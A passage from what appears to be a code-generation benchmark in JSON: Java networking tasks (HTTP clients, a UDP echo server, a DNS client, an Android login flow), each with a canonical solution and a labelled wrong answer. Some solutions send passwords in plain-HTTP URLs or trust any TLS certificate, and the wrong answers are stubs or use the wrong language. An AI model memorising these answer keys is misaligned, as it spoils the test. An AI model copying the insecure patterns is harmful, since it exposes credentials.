    "wrong_result": "public class HttpUtils {\n    public static class Error {\n        public int responseCode;\n        public String output;\n\n        @Override\n        public String toString() {\n            return \"Error{\" +\n                    \"responseCode=\" + responseCode +\n                    \", output='\" + output + '\\'' +\n                    '}';\n        }\n    }\n\n    public static String post(String request) throws Exception {\n        return post(request, \"\");\n    }\n\n    public static String post(String request, String body) throws Exception {\n        HttpURLConnection connection = (HttpURLConnection) new java.net.URL(request).openConnection();\n        connection.setRequestMethod(\"POST\");\n        connection.setDoOutput(true);\n        connection.setRequestProperty(\"Content-Type\", \"application/x-www-form-urlencoded\");\n\n        try (OutputStream os = connection.getOutputStream()) {\n            byte[] input = body.getBytes(\"utf-8\");\n            os.write(input, 0, input.length);\n        }\n\n        return handleResponse(connection, null);\n    }\n\n    public static String get(String request) throws Exception {\n        return get(request, null, 10000);\n    }\n\n    public static String get(String request, IOUtils.LineRead callback, int timeout) throws Exception {\n        HttpURLConnection connection = (HttpURLConnection) new java.net.URL(request).openConnection();\n        connection.setRequestMethod(\"GET\");\n        connection.setConnectTimeout(timeout);\n        connection.setReadTimeout(timeout);\n\n        return handleResponse(connection, callback);\n    }\n\n    private static String handleResponse(HttpURLConnection connection, IOUtils.LineRead callback) throws Exception {\n        int responseCode = connection.getResponseCode();\n        if (responseCode >= 400) {\n            throw new Exception(\"HTTP error code: \" + responseCode);\n        }\n\n        StringBuilder response = new StringBuilder();\n        try (BufferedReader reader = new BufferedReader(new InputStreamReader(connection.getInputStream()))) {\n            String line;\n            while ((line = reader.readLine()) != null) {\n                if (callback != null) {\n                    callback.read(line);\n                }\n                response.append(line).append(\"\\n\");\n            }\n        } catch (IOException e) {\n            StringBuilder errorResponse = new StringBuilder();\n            try (BufferedReader reader = new BufferedReader(new InputStreamReader(connection.getErrorStream()))) {\n                String line;\n                while ((line = reader.readLine()) != null) {\n                    errorResponse.append(line).append(\"\\n\");\n                }\n            }\n            Error error = new Error();\n            error.responseCode = responseCode;\n            error.output = errorResponse.toString();\n            throw new Exception(error.toString(), e);\n        }\n        return response.toString();\n    }\n}"
  },
  {
    "Task_id": 614,
    "Instruction": "Task Description: Implement a UDP server function that continuously listens for incoming packets, processes the received data by converting it to uppercase, and sends the modified data back to the client.\n\nFunction Description: The function sets up a UDP server that binds to a specific port (9876) and enters an infinite loop to receive incoming packets. Upon receiving a packet, it extracts the data, converts it to uppercase, and sends the modified data back to the client's address and port. The function handles all necessary UDP communication steps including socket creation, packet reception, data processing, and response transmission.\n\nInput: None (The function takes no parameters as it binds to a fixed port and processes incoming UDP packets)\n\nOutput: None (The function does not return any value but prints received messages to the console and sends responses back to clients)",
    "Canonical_solution": "import java.net.DatagramSocket;\nimport java.net.DatagramPacket;\nimport java.net.InetAddress;\n\nprivate void receiveServerUdpInfo() throws Exception {\n    DatagramSocket serverSocket = new DatagramSocket(9876);\n    byte[] receiveData = new byte[1024];\n    byte[] sendData = new byte[1024];\n    while(true) {\n        DatagramPacket receivePacket = new DatagramPacket(receiveData, receiveData.length);\n        serverSocket.receive(receivePacket);\n        String sentence = new String(receivePacket.getData());\n        System.out.println(\"RECEIVED: \" + sentence);\n        InetAddress IPAddress = receivePacket.getAddress();\n        int port = receivePacket.getPort();\n        String capitalizedSentence = sentence.toUpperCase();\n        sendData = capitalizedSentence.getBytes();\n        DatagramPacket sendPacket = new DatagramPacket(sendData, sendData.length, IPAddress, port);\n        serverSocket.send(sendPacket);\n    }\n}",
    "Code_level": "Function-level",
    "FSMID_for_test": 2,
    "wrong_result": "```python\nimport socket\n\ndef udp_server():\n    server_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n    server_socket.bind(('localhost', 9876))\n    print(\"UDP server is listening on port 9876...\")\n    while True:\n        data, client_address = server_socket.recvfrom(1024)\n        print(f\"Received message from {client_address}: {data.decode()}\")\n        modified_data = data.decode().upper()\n        server_socket.sendto(modified_data.encode(), client_address)\n```"
  },
  {
    "Task_id": 615,
    "Instruction": "Task Description: Implement a DNS UDP client class that can resolve DNS queries (A records and TXT records) by communicating with DNS servers over UDP.\n\nClass Description: The DnsUdpClient class provides functionality to send DNS queries to specified DNS servers and process the responses. It supports resolving domain names to IPv4 addresses (A records) and retrieving text records (TXT records).\n\nAttributes:\nDNS_SERVERS: InetSocketAddress[] - An array of predefined DNS server addresses with their respective ports\n\nMethods:\nresolveAOverUdp: resolveAOverUdp(InetSocketAddress dnsServer, byte[] query) -> List<Inet4Address> - Resolves a DNS A record query by sending it to the specified DNS server and returns a list of IPv4 addresses. Throws Exception if the operation fails.\n\ntoIps: toIps(byte[] buffer) -> List<Inet4Address> - Helper method that converts DNS response data into a list of IPv4 addresses by parsing A records.\n\nresolveTXTOverUdp: resolveTXTOverUdp(InetSocketAddress dnsServer, byte[] query) -> String - Resolves a DNS TXT record query by sending it to the specified DNS server and returns the text content. Throws Exception if the operation fails.\n\ntoTXT: toTXT(byte[] buffer) -> String - Helper method that extracts TXT record data from DNS response and returns it as a string. Throws RuntimeException if no TXT record is found.",
    "Canonical_solution": "import net.sf.ivmaidns.dns.DNSConnection;\nimport net.sf.ivmaidns.dns.DNSMsgHeader;\nimport net.sf.ivmaidns.dns.DNSName;\nimport net.sf.ivmaidns.dns.DNSRecord;\nimport java.io.IOException;\nimport java.net.DatagramPacket;\nimport java.net.DatagramSocket;\nimport java.net.Inet4Address;\nimport java.net.InetSocketAddress;\nimport java.util.ArrayList;\nimport java.util.List;\n\npublic class DnsUdpClient {\n    private final static InetSocketAddress[] DNS_SERVERS = new InetSocketAddress[]{\n            new InetSocketAddress(\"8.8.8.8\", 53),\n            new InetSocketAddress(\"208.67.222.222\", 443),\n            new InetSocketAddress(\"208.67.220.220\", 443),\n            new InetSocketAddress(\"199.91.73.222\", 3389),\n            new InetSocketAddress(\"87.118.100.175\", 110),\n            new InetSocketAddress(\"87.118.85.241\", 110),\n            new InetSocketAddress(\"77.109.139.29\", 110),\n            new InetSocketAddress(\"77.109.138.45\", 110)\n    };\n\n    public List<Inet4Address> resolveAOverUdp(InetSocketAddress dnsServer, byte[] query) throws Exception {\n        DatagramSocket datagramSocket = new DatagramSocket();\n        datagramSocket.setSoTimeout(1000);\n        try {\n            datagramSocket.connect(dnsServer.getAddress(), dnsServer.getPort());\n            datagramSocket.send(new DatagramPacket(query, query.length));\n            DatagramPacket packet = new DatagramPacket(new byte[2048], 2048);\n            datagramSocket.receive(packet);\n            return toIps(packet.getData());\n        } finally {\n            datagramSocket.close();\n        }\n    }\n\n    private List<Inet4Address> toIps(byte[] buffer) {\n        DNSRecord[] records = DNSConnection.decode(buffer);\n        List<Inet4Address> ips = new ArrayList<Inet4Address>();\n        for (DNSRecord record : records) {\n            if (DNSRecord.A == record.getRType()) {\n                if (record.getRData().length > 0) {\n                    ips.add((Inet4Address) record.getRData()[0]);\n                }\n            }\n        }\n        return ips;\n    }\n\n    public String resolveTXTOverUdp(InetSocketAddress dnsServer, byte[] query) throws Exception {\n        DatagramSocket datagramSocket = new DatagramSocket();\n        datagramSocket.setSoTimeout(2000);\n        try {\n            datagramSocket.connect(dnsServer.getAddress(), dnsServer.getPort());\n            datagramSocket.send(new DatagramPacket(query, query.length));\n            DatagramPacket packet = new DatagramPacket(new byte[2048], 2048);\n            datagramSocket.receive(packet);\n            return toTXT(packet.getData());\n        } finally {\n            datagramSocket.close();\n        }\n    }\n\n    private String toTXT(byte[] buffer) {\n        DNSRecord[] records = DNSConnection.decode(buffer);\n        for (DNSRecord record : records) {\n            if (DNSRecord.TXT == record.getRType() && record.getRData().length > 0) {\n                return (String) record.getRData()[0];\n            }\n        }\n        throw new RuntimeException(\"not found\");\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 2,
    "wrong_result": "import java.net.InetSocketAddress;\nimport java.net.Inet4Address;\nimport java.nio.ByteBuffer;\nimport java.util.ArrayList;\nimport java.util.List;\n\npublic class DnsUdpClient {\n    private static final InetSocketAddress[] DNS_SERVERS = {\n        new InetSocketAddress(\"8.8.8.8\", 53),\n        new InetSocketAddress(\"8.8.4.4\", 53)\n    };\n\n    public List<Inet4Address> resolveAOverUdp(InetSocketAddress dnsServer, byte[] query) throws Exception {\n        // Implementation for sending UDP query and receiving response\n        // Placeholder for actual UDP communication logic\n        return toIps(new byte[0]);\n    }\n\n    private List<Inet4Address> toIps(byte[] buffer) {\n        List<Inet4Address> ips = new ArrayList<>();\n        // Implementation for parsing A records from DNS response\n        return ips;\n    }\n\n    public String resolveTXTOverUdp(InetSocketAddress dnsServer, byte[] query) throws Exception {\n        // Implementation for sending UDP query and receiving response\n        // Placeholder for actual UDP communication logic\n        return toTXT(new byte[0]);\n    }\n\n    private String toTXT(byte[] buffer) {\n        // Implementation for parsing TXT records from DNS response\n        throw new RuntimeException(\"No TXT record found\");\n    }\n}"
  },
  {
    "Task_id": 62,
    "Instruction": "Task Description: Create a function to check if a given URL is accessible and usable by sending a HEAD request and verifying the HTTP response code.\n\nFunction Description: The function checks the accessibility of a URL by attempting to establish a connection and sending a HEAD request. It returns true if the URL responds with HTTP OK (status code 200), indicating it's usable, and false otherwise (including invalid URLs or connection failures).\n\nInput: \n- url: String - The URL to be checked for accessibility.\n\nOutput: \n- boolean - Returns true if the URL is accessible (HTTP status code 200), false otherwise.",
    "Canonical_solution": "import java.net.HttpURLConnection;\nimport java.net.URL;\n\npublic static boolean isUrlUsable(String url) {\n    if (CommonUtils.isEmpty(url)) {\n        return false;\n    }\n\n    URL urlTemp = null;\n    HttpURLConnection connt = null;\n    try {\n        urlTemp = new URL(url);\n        connt = (HttpURLConnection) urlTemp.openConnection();\n        connt.setRequestMethod(\"HEAD\");\n        int returnCode = connt.getResponseCode();\n        if (returnCode == HttpURLConnection.HTTP_OK) {\n            return true;\n        }\n    } catch (Exception e) {\n        return false;\n    } finally {\n        connt.disconnect();\n    }\n    return false;\n}",
    "Code_level": "Function-level",
    "FSMID_for_test": 16,
    "wrong_result": "```python\nimport requests\n\ndef is_url_accessible(url):\n    try:\n        response = requests.head(url, timeout=10)\n        return response.status_code == 200\n    except:\n        return False\n```"
  },
  {
    "Task_id": 63,
    "Instruction": "Task Description: Create a Java class that implements an HTTP client for sending feedback data to a remote server using HttpURLConnection.\n\nClass Description: The HttpFeedbackClient class provides functionality to send feedback content and environment information to a specified URL via HTTP POST request. It handles connection setup, parameter encoding, request sending, and response handling with appropriate callbacks for success or failure scenarios.\n\nAttributes:\ncontent: String - The feedback content to be sent to the server\nenv: String - The environment information associated with the feedback\ncallback: OnRequestCallback - The callback interface for handling request results\n\nMethods:\nsendFeedback: sendFeedback() -> void - Sends the feedback data to the server. Sets up the HTTP connection, encodes parameters, writes the request body, and processes the response. Calls onSuccess() or onFailure() on the callback object depending on the outcome.\n\nNote: The OnRequestCallback interface (not shown in the reference code) would typically contain two methods:\n- onSuccess(): Called when the request completes successfully\n- onFailure(Exception e): Called when the request fails, with the exception that occurred",
    "Canonical_solution": "import com.antfortune.freeline.idea.utils.NotificationUtils;\nimport java.io.BufferedWriter;\nimport java.io.IOException;\nimport java.io.OutputStream;\nimport java.io.OutputStreamWriter;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\nimport java.net.URLEncoder;\n\npublic class HttpFeedbackClient {\n\n    private String content;\n    private String env;\n    private OnRequestCallback callback;\n\n    public HttpFeedbackClient(String content, String env, OnRequestCallback callback) {\n        this.content = content;\n        this.env = env;\n        this.callback = callback;\n    }\n\n    public void sendFeedback() {\n        try {\n            URL url = new URL(\"https://www.freelinebuild.com/api/feedback\");\n            HttpURLConnection conn = (HttpURLConnection) url.openConnection();\n            conn.setReadTimeout(10000);\n            conn.setConnectTimeout(15000);\n            conn.setRequestMethod(\"POST\");\n            conn.setDoInput(true);\n            conn.setDoOutput(true);\n\n            StringBuilder builder = new StringBuilder();\n            builder.append(URLEncoder.encode(\"content\", \"UTF-8\"));\n            builder.append(\"=\");\n            builder.append(URLEncoder.encode(content, \"UTF-8\"));\n            builder.append(\"&\");\n            builder.append(URLEncoder.encode(\"env\", \"UTF-8\"));\n            builder.append(\"=\");\n            builder.append(URLEncoder.encode(env, \"UTF-8\"));\n\n            OutputStream os = conn.getOutputStream();\n            BufferedWriter writer = new BufferedWriter(new OutputStreamWriter(os, \"UTF-8\"));\n            writer.write(builder.toString());\n            writer.flush();\n            writer.close();\n            os.close();\n\n            int responseCode = conn.getResponseCode();\n            if (responseCode >= 400) {\n                this.callback.onFailure(new Exception(conn.getResponseMessage()));\n            } else {\n                this.callback.onSuccess();\n            }\n            conn.disconnect();\n        } catch (IOException e) {\n            this.callback.onFailure(e);\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 16,
    "wrong_result": "public class HttpFeedbackClient {\n    private String content;\n    private String env;\n    private OnRequestCallback callback;\n\n    public HttpFeedbackClient(String content, String env, OnRequestCallback callback) {\n        this.content = content;\n        this.env = env;\n        this.callback = callback;\n    }\n\n    public void sendFeedback() {\n        try {\n            String url = \"https://example.com/feedback\";\n            HttpURLConnection connection = (HttpURLConnection) new java.net.URL(url).openConnection();\n            connection.setRequestMethod(\"POST\");\n            connection.setDoOutput(true);\n            connection.setRequestProperty(\"Content-Type\", \"application/x-www-form-urlencoded\");\n\n            String postData = \"content=\" + java.net.URLEncoder.encode(content, \"UTF-8\") +\n                              \"&env=\" + java.net.URLEncoder.encode(env, \"UTF-8\");\n\n            try (java.io.OutputStream os = connection.getOutputStream()) {\n                byte[] input = postData.getBytes(\"utf-8\");\n                os.write(input, 0, input.length);\n            }\n\n            int responseCode = connection.getResponseCode();\n            if (responseCode == HttpURLConnection.HTTP_OK) {\n                callback.onSuccess();\n            } else {\n                callback.onFailure(new Exception(\"HTTP error code: \" + responseCode));\n            }\n        } catch (Exception e) {\n            callback.onFailure(e);\n        }\n    }\n\n    public interface OnRequestCallback {\n        void onSuccess();\n        void onFailure(Exception e);\n    }\n}"
  },
  {
    "Task_id": 64,
    "Instruction": "Task Description: Create a Java class that implements HTTP client functionality using HttpURLConnection to make GET requests and handle responses.\n\nClass Description: The HttpClient class provides functionality to send HTTP GET requests to a specified URL and retrieve the response. It handles connection timeouts, sets appropriate request headers, and processes the response stream.\n\nAttributes: None\n\nMethods:\n- request: [Name](String url) -> String - Sends a GET request to the specified URL and returns the response body as a string. Sets connection timeout to 3 seconds, read timeout to 90 seconds, and configures appropriate request headers including content type and character encoding. Returns null if the request fails or response code is not 200.",
    "Canonical_solution": "import java.io.BufferedReader;\nimport java.io.IOException;\nimport java.io.InputStreamReader;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\n\npublic class HttpClient {\n\n    public String request(String url) {\n        HttpURLConnection connection = null;\n        BufferedReader reader = null;\n        try {\n            URL getUrl = new URL(url);\n            connection = (HttpURLConnection) getUrl.openConnection();\n            connection.setReadTimeout(90000);\n            connection.setConnectTimeout(3000);\n            connection.setRequestMethod(\"GET\");\n            connection.setRequestProperty(\"Accept-Charset\", \"utf-8\");\n            connection.setRequestProperty(\"Content-Type\", \"application/json\");\n            connection.setRequestProperty(\"Charset\", \"UTF-8\");\n            \n            if (200 == connection.getResponseCode()) {\n                reader = new BufferedReader(new InputStreamReader(connection.getInputStream(), \"UTF-8\"));\n                StringBuilder result = new StringBuilder();\n                String line = null;\n                while ((line = reader.readLine()) != null) {\n                    result.append(line);\n                }\n                return result.toString();\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        } finally {\n            if (connection != null) {\n                connection.disconnect();\n            }\n        }\n        return null;\n    }\n\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 16,
    "wrong_result": "public class HttpClient {\n    public String request(String url) {\n        try {\n            java.net.URL uri = new java.net.URL(url);\n            java.net.HttpURLConnection connection = (java.net.HttpURLConnection) uri.openConnection();\n            connection.setRequestMethod(\"GET\");\n            connection.setConnectTimeout(3000);\n            connection.setReadTimeout(90000);\n            connection.setRequestProperty(\"Content-Type\", \"application/x-www-form-urlencoded\");\n            connection.setRequestProperty(\"Charset\", \"UTF-8\");\n            int responseCode = connection.getResponseCode();\n            if (responseCode == 200) {\n                java.io.BufferedReader reader = new java.io.BufferedReader(new java.io.InputStreamReader(connection.getInputStream()));\n                StringBuilder response = new StringBuilder();\n                String line;\n                while ((line = reader.readLine()) != null) {\n                    response.append(line);\n                }\n                reader.close();\n                return response.toString();\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n        return null;\n    }\n}"
  },
  {
    "Task_id": 65,
    "Instruction": "Task Description: Implement a class that handles preloading of HTTP content in the background using a thread pool, with support for cancellation and blacklisting of failed URLs.\n\nClass Description: The PreloadTask class is a Runnable implementation that preloads HTTP content from a given URL up to a specified length. It manages connection timeouts, handles failures by blacklisting URLs, and supports task cancellation. The class works with an HttpProxyCacheServer to get proxied URLs and executes tasks through an ExecutorService.\n\nAttributes:\n- mRawUrl: String - The original URL to be preloaded\n- mPosition: int - The position/index of this preload task (optional tracking)\n- mCacheServer: HttpProxyCacheServer - The proxy server used to get cached URLs\n- mIsCanceled: boolean - Flag indicating if the task was canceled\n- mIsExecuted: boolean - Flag indicating if the task was executed\n- blackList: static List<String> - Shared list of URLs that failed to load\n\nMethods:\n- run(): void - The main execution method called by the thread pool, which starts the preload task if not canceled\n- start(): void - Internal method that performs the actual HTTP request and content preloading\n- executeOn(ExecutorService executorService): void - Submits the task to the provided executor service\n- cancel(): void - Cancels the task if it has been executed but not completed",
    "Canonical_solution": "import java.io.BufferedInputStream;\nimport java.io.InputStream;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\nimport java.util.ArrayList;\nimport java.util.List;\n\npublic class PreloadTask implements Runnable {\n\n    public String mRawUrl;\n    public int mPosition;\n    public HttpProxyCacheServer mCacheServer;\n    private boolean mIsCanceled;\n    private boolean mIsExecuted;\n    private final static List<String> blackList = new ArrayList<>();\n\n    @Override\n    public void run() {\n        if (!mIsCanceled) {\n            start();\n        }\n        mIsExecuted = false;\n        mIsCanceled = false;\n    }\n\n    private void start() {\n        if (blackList.contains(mRawUrl)) return;\n        HttpURLConnection connection = null;\n        try {\n            String proxyUrl = mCacheServer.getProxyUrl(mRawUrl);\n            URL url = new URL(proxyUrl);\n            connection = (HttpURLConnection) url.openConnection();\n            connection.setConnectTimeout(5_000);\n            connection.setReadTimeout(5_000);\n            InputStream in = new BufferedInputStream(connection.getInputStream());\n            int length;\n            int read = -1;\n            byte[] bytes = new byte[8 * 1024];\n            while ((length = in.read(bytes)) != -1) {\n                read += length;\n                if (mIsCanceled || read >= PreloadManager.PRELOAD_LENGTH) {\n                    break;\n                }\n            }\n        } catch (Exception e) {\n            blackList.add(mRawUrl);\n        } finally {\n            if (connection != null) {\n                connection.disconnect();\n            }\n        }\n    }\n\n    public void executeOn(ExecutorService executorService) {\n        if (mIsExecuted) return;\n        mIsExecuted = true;\n        executorService.submit(this);\n    }\n\n    public void cancel() {\n        if (mIsExecuted) {\n            mIsCanceled = true;\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 16,
    "wrong_result": "```java\nimport java.io.IOException;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\nimport java.util.List;\nimport java.util.concurrent.ExecutorService;\nimport java.util.concurrent.atomic.AtomicBoolean;\n\npublic class PreloadTask implements Runnable {\n    private final String mRawUrl;\n    private final int mPosition;\n    private final HttpProxyCacheServer mCacheServer;\n    private final AtomicBoolean mIsCanceled = new AtomicBoolean(false);\n    private final AtomicBoolean mIsExecuted = new AtomicBoolean(false);\n    private static final List<String> blackList = new java.util.ArrayList<>();\n\n    public PreloadTask(String rawUrl, int position, HttpProxyCacheServer cacheServer) {\n        this.mRawUrl = rawUrl;\n        this.mPosition = position;\n        this.mCacheServer = cacheServer;\n    }\n\n    @Override\n    public void run() {\n        if (!mIsCanceled.get()) {\n            start();\n        }\n    }\n\n    private void start() {\n        if (mIsExecuted.get()) {\n            return;\n        }\n        mIsExecuted.set(true);\n\n        String cachedUrl = mCacheServer.getProxyUrl(mRawUrl);\n        if (cachedUrl == null || blackList.contains(mRawUrl)) {\n            return;\n        }\n\n        try {\n            URL url = new URL(cachedUrl);\n            HttpURLConnection connection = (HttpURLConnection) url.openConnection();\n            connection.setRequestMethod(\"GET\");\n            connection.setConnectTimeout(5000);\n            connection.setReadTimeout(10000);\n\n            int responseCode = connection.getResponseCode();\n            if (responseCode == HttpURLConnection.HTTP_OK) {\n                // Simulate content preloading\n                byte[] buffer = new byte[1024];\n                int bytesRead;\n                while ((bytesRead = connection.getInputStream().read(buffer)) != -1) {\n                    // Process the data as needed\n                }\n            } else {\n                blackList.add(mRawUrl);\n            }\n        } catch (IOException e) {\n            blackList.add(mRawUrl);\n        } finally {\n            mIsExecuted.set(false);\n        }\n    }\n\n    public void executeOn(ExecutorService executorService) {\n        executorService.execute(this);\n    }\n\n    public void cancel() {\n        mIsCanceled.set(true);\n    }\n}\n```"
  },
  {
    "Task_id": 66,
    "Instruction": "Task Description: Create a Java class that handles HTTP requests asynchronously using HttpURLConnection, specifically designed for Android applications to fetch and process JSON data from a server.\n\nClass Description: HttpRequestHandler is a utility class containing an inner AsyncTask subclass (MyAsyncTaskgetNews) that performs HTTP GET requests in the background. It handles connection setup, timeout configuration, input stream processing, and JSON response parsing. The class demonstrates typical operations for user authentication flows.\n\nAttributes:\n- None (All required objects are created locally within methods)\n\nMethods:\n- MyAsyncTaskgetNews: [Inner Class] - Extends AsyncTask<String, String, String> to perform network operations off the UI thread\n  - doInBackground(String... params) -> String - Main execution method that:\n    1. Takes URL string as input parameter\n    2. Establishes HTTP connection with 7-second timeout\n    3. Reads input stream and converts to string\n    4. Publishes progress with response data\n    5. Returns null (results handled via progress updates)\n  \n  - onProgressUpdate(String... progress) -> void - UI thread callback that:\n    1. Parses JSON response\n    2. Handles \"user is added\" case by showing toast and initiating login\n    3. Processes successful login by saving user credentials\n    4. Handles errors via logging\n\nNote: The class assumes existence of helper classes (Operations for stream conversion, SaveSettings for persistence) and Android context availability via getApplicationContext().",
    "Canonical_solution": "import android.os.AsyncTask;\nimport java.io.BufferedInputStream;\nimport java.io.InputStream;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\n\npublic class HttpRequestHandler {\n\n    public static class MyAsyncTaskgetNews extends AsyncTask<String, String, String> {\n        @Override\n        protected String doInBackground(String... params) {\n            try {\n                String NewsData;\n                URL url = new URL(params[0]);\n                HttpURLConnection urlConnection = (HttpURLConnection) url.openConnection();\n                urlConnection.setConnectTimeout(7000);\n\n                try {\n                    InputStream in = new BufferedInputStream(urlConnection.getInputStream());\n                    Operations operations = new Operations(getApplicationContext());\n                    NewsData = operations.ConvertInputToStringNoChange(in);\n                    publishProgress(NewsData);\n                } finally {\n                    urlConnection.disconnect();\n                }\n            } catch (Exception ex) {}\n            return null;\n        }\n\n        protected void onProgressUpdate(String... progress) {\n            try {\n                JSONObject json = new JSONObject(progress[0]);\n                if (json.getString(\"msg\") == null)\n                    return;\n                if (json.getString(\"msg\").equalsIgnoreCase(\"user is added\")) {\n                    Toast.makeText(getApplicationContext(), json.getString(\"msg\"), Toast.LENGTH_LONG).show();\n                    String url = \"http://10.0.2.2/~hussienalrubaye/twitterserver/login.php?email=\" + etEmail.getText().toString() + \"&password=\" + etPassword.getText().toString();\n                    new MyAsyncTaskgetNews().execute(url);\n                }\n\n                if (json.getString(\"msg\").equalsIgnoreCase(\"Pass Login\")) {\n                    JSONArray UserInfo = new JSONArray(json.getString(\"info\"));\n                    JSONObject UserCreintal = UserInfo.getJSONObject(0);\n                    hideProgressDialog();\n                    SaveSettings saveSettings = new SaveSettings(getApplicationContext());\n                    saveSettings.SaveData(UserCreintal.getString(\"user_id\"));\n                    finish();\n                }\n            } catch (Exception ex) {\n                Log.d(\"er\", ex.getMessage());\n            }\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 16,
    "wrong_result": "```java\npublic class HttpRequestHandler {\n    private class MyAsyncTaskgetNews extends AsyncTask<String, String, String> {\n        @Override\n        protected String doInBackground(String... params) {\n            String url = params[0];\n            try {\n                URL requestUrl = new URL(url);\n                HttpURLConnection connection = (HttpURLConnection) requestUrl.openConnection();\n                connection.setRequestMethod(\"GET\");\n                connection.setConnectTimeout(7000);\n                connection.setReadTimeout(7000);\n                connection.setDoInput(true);\n                connection.connect();\n\n                int responseCode = connection.getResponseCode();\n                if (responseCode == HttpURLConnection.HTTP_OK) {\n                    String response = Operations.convertStreamToString(connection.getInputStream());\n                    publishProgress(response);\n                } else {\n                    publishProgress(\"Error: \" + responseCode);\n                }\n            } catch (Exception e) {\n                publishProgress(\"Exception: \" + e.getMessage());\n            }\n            return null;\n        }\n\n        @Override\n        protected void onProgressUpdate(String... progress) {\n            String response = progress[0];\n            if (response.startsWith(\"Error:\") || response.startsWith(\"Exception:\")) {\n                Log.e(\"HttpRequestHandler\", response);\n                return;\n            }\n\n            try {\n                JSONObject jsonResponse = new JSONObject(response);\n                if (jsonResponse.has(\"message\") && jsonResponse.getString(\"message\").equals(\"user is added\")) {\n                    Toast.makeText(getApplicationContext(), \"User added successfully\", Toast.LENGTH_SHORT).show();\n                    // Initiate login process\n                } else if (jsonResponse.has(\"token\")) {\n                    SaveSettings.saveUserCredentials(jsonResponse.getString(\"username\"), jsonResponse.getString(\"token\"));\n                    // Proceed to next activity or update UI\n                } else {\n                    Log.e(\"HttpRequestHandler\", \"Unexpected JSON response: \" + response);\n                }\n            } catch (JSONException e) {\n                Log.e(\"HttpRequestHandler\", \"JSON parsing error: \" + e.getMessage());\n            }\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 69,
    "Instruction": "Task Description: Create a Java utility class for making HTTP requests with support for both GET and POST methods, handling parameters, headers, and SSL configurations.\n\nClass Description: SimpleHttpUtils is a utility class that provides methods to perform HTTP requests (GET/POST) with configurable parameters, headers, timeouts, and SSL settings. It handles URL encoding, parameter serialization, and response processing.\n\nAttributes:\n- logger: Log - Logger instance for logging messages\n- DEFAULT_CHARSET: String - Default character encoding (utf-8)\n- HTTP_METHOD_POST: String - Constant for POST method\n- HTTP_METHOD_GET: String - Constant for GET method\n- HTTP_ERROR_MESSAGE: String - Key for error messages\n- DEFAULT_READ_TIMEOUT: int - Default read timeout in milliseconds\n- DEFAULT_CONNECT_TIMEOUT: int - Default connection timeout in milliseconds\n- HTTP_PREFIX: String - HTTP URL prefix\n- HTTPS_PREFIX: String - HTTPS URL prefix\n- MAX_FETCHSIZE: int - Maximum fetch size limit\n- trustAnyManagers: TrustManager[] - Array of trust managers for SSL\n\nMethods:\n- httpPost(String url, Map params) -> String - Makes an HTTP POST request to the specified URL with given parameters\n- httpGet(String url, Map params) -> String - Makes an HTTP GET request to the specified URL with given parameters\n- httpRequest(String url, Map<String,String> params, String method, String charSet, Map<String,String> headers) -> String - Makes an HTTP request with configurable method, charset and headers\n- httpRequest(SimpleHttpParam httpParam) -> SimpleHttpResult - Makes an HTTP request with comprehensive configuration options\n- mapToQueryString(Map parameters, String charSet) -> String - Converts a parameter map to a URL-encoded query string\n- urlEncode(String url, String charSet) -> String - URL-encodes a given string\n- setSSLSocketFactory(HttpURLConnection urlConn, boolean sslVerify, boolean hostnameVerify, TrustKeyStore trustKeyStore, ClientKeyStore clientKeyStore) -> void - Configures SSL settings for the connection\n- makeStringList(Object value) -> List<String> - Converts an input value to a list of strings\n\nNested Classes:\n- TrustAnyTrustManager: Implements X509TrustManager for custom SSL certificate handling\n- TrustAnyHostnameVerifier: Implements HostnameVerifier for custom hostname verification",
    "Canonical_solution": "import org.apache.commons.logging.Log;\nimport org.apache.commons.logging.LogFactory;\nimport javax.net.ssl.*;\nimport java.io.*;\nimport java.lang.reflect.Array;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\nimport java.net.URLDecoder;\nimport java.net.URLEncoder;\nimport java.nio.charset.Charset;\nimport java.security.KeyStore;\nimport java.security.cert.CertificateException;\nimport java.security.cert.X509Certificate;\nimport java.util.*;\nimport java.util.Map.Entry;\n\npublic class SimpleHttpUtils {\n    private static final Log logger = LogFactory.getLog(SimpleHttpUtils.class);\n    public static final String DEFAULT_CHARSET = \"utf-8\";\n    public static final String HTTP_METHOD_POST = \"POST\";\n    public static final String HTTP_METHOD_GET = \"GET\";\n    public static final String HTTP_ERROR_MESSAGE = \"http_error_message\";\n    public static final int DEFAULT_READ_TIMEOUT = 20000;\n    public static final int DEFAULT_CONNECT_TIMEOUT = 10000;\n    public static final String HTTP_PREFIX = \"http://\";\n    public static final String HTTPS_PREFIX = \"https://\";\n    public static final int MAX_FETCHSIZE = 5000;\n    private static TrustManager[] trustAnyManagers = new TrustManager[]{new TrustAnyTrustManager()};\n\n    static {\n        System.setProperty(\"sun.net.inetaddr.ttl\", \"3600\");\n    }\n\n    public static String httpPost(String url, Map params) {\n        return httpRequest(url, params, HTTP_METHOD_POST, DEFAULT_CHARSET, null);\n    }\n\n    public static String httpGet(String url, Map params) {\n        return httpRequest(url, params, HTTP_METHOD_GET, DEFAULT_CHARSET, null);\n    }\n\n    public static String httpRequest(String url, Map<String,String> params, String method,\n                                    String charSet, Map<String,String> headers) {\n        SimpleHttpParam param = new SimpleHttpParam(url);\n        if(null != param){\n            param.setParameters(params);\n        }\n        if(null != headers){\n            param.setHeaders(headers);\n        }\n        param.setCharSet(charSet);\n        param.setMethod(method);\n        SimpleHttpResult result = httpRequest(param);\n        if(result==null || !result.isSuccess()){\n            return null;\n        }else{\n            return result.getContent();\n        }\n    }\n\n    public static SimpleHttpResult httpRequest(SimpleHttpParam httpParam) {\n        String url = httpParam.getUrl();\n        Map<String,Object> parameters = httpParam.getParameters();\n        String sMethod = httpParam.getMethod();\n        String charSet = httpParam.getCharSet();\n        boolean sslVerify = httpParam.isSslVerify();\n        int 